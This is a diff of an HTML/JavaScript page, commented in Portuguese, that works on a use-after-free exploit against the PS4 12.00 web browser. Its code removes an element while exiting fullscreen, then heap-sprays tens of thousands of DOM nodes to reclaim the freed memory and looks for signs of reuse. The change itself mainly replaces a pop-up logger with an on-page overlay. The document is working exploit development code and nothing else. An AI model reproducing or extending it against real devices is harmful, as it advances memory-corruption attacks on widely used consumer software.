@@ -2,47 +2,43 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Aggressive Reclaim (External Logger FIX)</title>
+<title>PS4 12.00 - UAF Aggressive Reclaim (Overlay Logger)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Aggressive Reclaim (External Logger)</h2>
+<h2>PS4 12.00 - UAF Aggressive Reclaim (Overlay Logger)</h2>
 <button onclick="runTest()">Run Test</button>
 
+<!-- 🔥 LOGGER OVERLAY (persistente) -->
+<div id="overlay" style="
+position:fixed;
+bottom:0;
+left:0;
+width:100%;
+height:200px;
+background:black;
+color:lime;
+overflow:auto;
+font-size:12px;
+z-index:999999;
+padding:5px;
+font-family:monospace;">
+</div>
+
 <script>
-let logWindow = null;
+let logBuffer = [];
 
-// ==========================
-// LOGGER EXTERNO REAL (igual ao que funcionou)
-// ==========================
-function initLogger() {
-    logWindow = window.open("", "logger", "width=600,height=400");
+function flushLog() {
+    let o = document.getElementById("overlay");
+    if (!o) return;
 
-    if (logWindow) {
-        logWindow.document.open();
-        logWindow.document.write(`
-            <html>
-            <body style="background:black;color:lime;font-family:monospace;">
-            <h3>LOG OUTPUT</h3>
-            <pre id="log"></pre>
-            </body>
-            </html>
-        `);
-        logWindow.document.close();
-    }
+    o.innerHTML = logBuffer.slice(-50).join("<br>");
 }
 
 function log(msg) {
     try { console.log(msg); } catch(e){}
-
-    try {
-        if (logWindow && !logWindow.closed) {
-            let el = logWindow.document.getElementById("log");
-            if (el) {
-                el.textContent += msg + "\\n";
-            }
-        }
-    } catch(e){}
+    logBuffer.push(msg);
+    flushLog();
 }
 
 // ==========================
@@ -85,21 +81,21 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 🎯 TARGETED RECLAIM (CORRETO)
+// 🎯 TARGETED RECLAIM
 // ==========================
 function targetedReclaim() {
     log("[*] Targeted reclaim iniciado");
 
     let bucket = [];
 
-    // Fragmentação leve
+    // Fragmentação
     for (let i = 0; i < 5000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // 🔥 CLONE DO fsTarget
+    // 🔥 CLONES DO fsTarget
     for (let i = 0; i < 20000; i++) {
         let el = document.createElement("div");
 
@@ -114,10 +110,10 @@ function targetedReclaim() {
         document.body.appendChild(el);
         bucket.push(el);
 
-        if (i < 40) log("REUSE_EL_" + i);
+        if (i < 20) log("REUSE_EL_" + i);
     }
 
-    // Pressão adicional
+    // pressão extra
     for (let i = 0; i < 10000; i++) {
         let txt = document.createTextNode("TXT_" + i);
         document.body.appendChild(txt);
@@ -125,7 +121,6 @@ function targetedReclaim() {
     }
 
     log("[*] Targeted reclaim finalizado: " + bucket.length);
-    return bucket;
 }
 
 // ==========================
@@ -147,18 +142,6 @@ function checkUAF(fsTarget) {
     }
 
     try {
-        let outer = fsTarget.outerHTML;
-        log("[CHECK] outerHTML = " + outer);
-
-        if (outer && outer.indexOf("REUSE_") !== -1) {
-            log("🔥 REUSE DETECTADO (outerHTML)");
-        }
-
-    } catch(e) {
-        log("[UAF] outerHTML erro: " + e);
-    }
-
-    try {
         let txt = fsTarget.textContent;
         log("[CHECK] textContent = " + txt);
 
@@ -166,23 +149,14 @@ function checkUAF(fsTarget) {
             log("🔥 REUSE DETECTADO (textContent)");
         }
 
-    } catch(e) {
-        log("[UAF] textContent erro: " + e);
-    }
-
-    try {
-        let node = fsTarget.firstChild;
-        log("[CHECK] firstChild = " + node);
-    } catch(e) {
-        log("[UAF] firstChild erro: " + e);
-    }
+    } catch(e) {}
 }
 
 // ==========================
 // TRIGGER (INALTERADO)
 // ==========================
 function trigger(fsTarget) {
-    log("[*] Trigger: remove + exitFullscreen");
+    log("[*] Trigger");
 
     try {
         fsTarget.remove();
@@ -195,7 +169,6 @@ function trigger(fsTarget) {
         log("[ERRO] " + e);
     }
 
-    // 🔥 janela crítica intacta
     setTimeout(() => targetedReclaim(), 0);
     setTimeout(() => targetedReclaim(), 50);
     setTimeout(() => targetedReclaim(), 100);
@@ -209,15 +182,14 @@ function trigger(fsTarget) {
 // MAIN
 // ==========================
 function runTest() {
-    initLogger(); // 🔥 ESSENCIAL
-
+    logBuffer = [];
     log("[*] Iniciando teste");
 
     let controllers = setupHeap();
     let fsTarget = setupFullscreen();
 
     window.onblur = function() {
-        log("[*] onblur disparado");
+        log("[*] onblur");
 
         setTimeout(() => trigger(fsTarget), 3000);
     };
